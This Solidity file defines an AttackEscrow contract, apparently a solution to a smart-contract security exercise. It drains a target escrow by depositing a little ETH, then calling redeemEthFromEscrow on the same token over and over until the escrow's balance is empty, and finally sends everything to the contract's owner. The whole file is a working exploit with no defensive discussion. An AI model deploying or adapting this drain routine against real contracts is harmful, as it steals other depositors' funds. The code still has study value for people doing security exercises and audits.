// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface IEScrowNFT is IERC721 {
    function tokenDetails(uint256) external view returns (uint256, uint256);
    function tokenCounter() external view returns (uint256);
}

interface IEscrow {
    function escrowEth(address _recipient, uint256 _duration) external payable;
    function redeemEthFromEscrow(uint256 _tokenId) external;
}

contract AttackEscrow is Ownable {
    IEScrowNFT private escrowNFT;
    IEscrow private immutable escrow;

    constructor(address _escrowNFT, address _escrow) {
        escrowNFT = IEScrowNFT(_escrowNFT);
        escrow = IEscrow(_escrow);
    }

    function attack() external payable onlyOwner {
        // Implement your attack logic here
        escrow.escrowEth{value: msg.value}(address(this), 0);
        uint256 tokenId = escrowNFT.tokenCounter();

        uint256 escrowETHBalance = address(escrow).balance;

        while (escrowETHBalance > 0) {
            escrow.redeemEthFromEscrow(tokenId);
            escrowETHBalance = address(escrow).balance;
        }

        // Transfer all ETH to the owner
        (bool success,) = owner().call{value: address(this).balance}("");
        require(success, "Transfer to owner failed");
    }

    receive() external payable {
        // Fallback function to receive ETH
    }
}
